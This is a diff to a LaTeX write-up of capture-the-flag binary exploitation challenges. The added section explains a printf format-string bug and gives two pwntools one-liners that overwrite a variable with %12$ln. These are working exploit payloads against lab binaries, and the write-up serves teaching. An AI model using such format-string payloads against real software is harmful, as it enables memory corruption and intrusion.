@@ -96,3 +96,18 @@ Reversing the binary allows us to understand the offset of the stored RIP in \te
 By filling the stack with 1048 bytes of padding and appeding the desired address (\textit{0000000000400897}) at the end of the payload, the challenge is solved.
 
 See: \textit{scripts/1996.py}
+
+\subsection{}
+Objective: change the value of \texttt{the_answer} variable in \texttt{.data} section, replacing its content with the value 42.
+
+From the application source code, call to \texttt{printf} with arbitrary user input can be noticed.
+The user input is fed to the function as a first argument, thus enabling format strings interpretation.
+A format string attack is therefore chosen.
+
+Address of the variable is extracted from the symbol table: \texttt{objdump -t the_answer | grep answer}. \\
+Result: \textit{0x0000000000601078}
+
+Solution#1: \texttt{python3 -c 'import sys; from pwn import p32; sys.stdout.buffer.write(b"\%42c\%12\$ln".ljust(16, b"A") + p32(0x0000000000601078).ljust(8, b"\0") + b"\n")' | ./the_answer}
+Solution#2: \texttt{python3 -c 'import sys; from pwn import p32; sys.stdout.buffer.write(b"AAAAAA\%36c\%12\$ln" + p32(0x0000000000601078).ljust(8, b"\0") + b"\n")'}
+
+The attack consists in writing 42 bytes, then jumping to printf variadic stack that contains the target address, writing emitted bytes/chars (42) in that location with \texttt{\%12\$ln}.
